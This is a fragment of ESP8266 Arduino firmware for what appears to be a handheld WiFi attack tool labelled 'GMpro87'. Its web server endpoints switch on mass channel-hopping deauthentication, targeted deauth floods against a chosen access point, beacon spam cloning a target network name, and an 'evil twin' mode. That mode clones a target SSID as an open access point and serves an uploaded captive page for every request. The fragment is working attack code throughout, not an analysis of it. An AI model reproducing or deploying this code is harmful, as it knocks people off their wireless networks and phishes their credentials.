...
void setup() {
  ...
  server.on("/scan", [](){
    int n = WiFi.scanNetworks(false, true); String j = "[";
    for (int i=0; i<n; i++) { j += "{\"s\":\""+WiFi.SSID(i)+"\",\"c\":"+String(WiFi.channel(i))+",\"r\":"+String(2*(WiFi.RSSI(i)+100))+",\"b\":\""+WiFi.BSSIDstr(i)+"\"}"; if (i<n-1) j+=","; }
    j += "]"; server.send(200, "application/json", j);
  });

  server.on("/toggle", [](){
    String m = server.arg("m"), st="OFF";
    if(m=="kill") isMassKill=!isMassKill; else if(m=="deauth") isDeauth=!isDeauth;
    else if(m=="spam") isSpam=!isSpam; else if(m=="evil") isEvil=!isEvil;
    if((m=="kill"&&isMassKill)||(m=="deauth"&&isDeauth)||(m=="spam"&&isSpam)||(m=="evil"&&isEvil)) st="ON";
    packetLog += "[SYS] " + m + ": " + st + "<br>"; server.send(200, "text/plain", st);
  });
  ...
  server.on("/upload", HTTP_POST, [](){ server.send(200); }, [](){
    ...
    else if(u.status == UPLOAD_FILE_END && fsUploadFile) fsUploadFile.close();
  });

  server.on("/setspam", [](){ beaconAmount = server.arg("n").toInt(); server.send(200); });
  server.on("/setetpage", [](){ activeEtPage = server.arg("p"); server.send(200); });
  server.on("/getlogs", [](){ server.send(200, "text/plain", packetLog); packetLog=""; });
  server.on("/", [](){ server.send(200, "text/html", INDEX_HTML); });

  server.onNotFound([](){
    if(isEvil){ File f = SPIFFS.open(activeEtPage, "r"); if(f){ server.streamFile(f, "text/html"); f.close(); return; } }
    server.send(404);
  });
...
void loop() {
  ...
  unsigned long now = millis(); static unsigned long lastAtk = 0;

  if (now - lastAtk > 100) {
    lastAtk = now;
    if (isMassKill) { currentCh=(currentCh%13)+1; wifi_set_channel(currentCh); uint8_t br[6]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}; memcpy(&deauthPkt[4],br,6); wifi_send_pkt_freedom(deauthPkt, 26, 0); }
    if (isDeauth && targetBSSID != "") { wifi_set_channel(targetCh); for(int i=0;i<10;i++) wifi_send_pkt_freedom(deauthPkt, 26, 0); }
    if (isSpam && targetSSID != "") { wifi_set_channel(targetCh); for(int i=0;i<beaconAmount;i++) sendBeacon(targetSSID, targetCh); }
    
    if (isEvil && targetSSID != "") { if(WiFi.softAPSSID() != targetSSID) WiFi.softAP(targetSSID.c_str()); }
    else if (!isEvil && WiFi.softAPSSID() != adminSSID) WiFi.softAP(adminSSID.c_str(), adminPW.c_str());
  }

  static unsigned long lastOLED = 0;
  if (now - lastOLED > 1000) {
    display.clearDisplay(); display.setCursor(0,0); display.setTextColor(WHITE);
    display.printf("GMpro87\nM:%s D:%s\nS:%s E:%s", isMassKill?"ON":"-", isDeauth?"ON":"-", isSpam?"ON":"-", isEvil?"ON":"-");
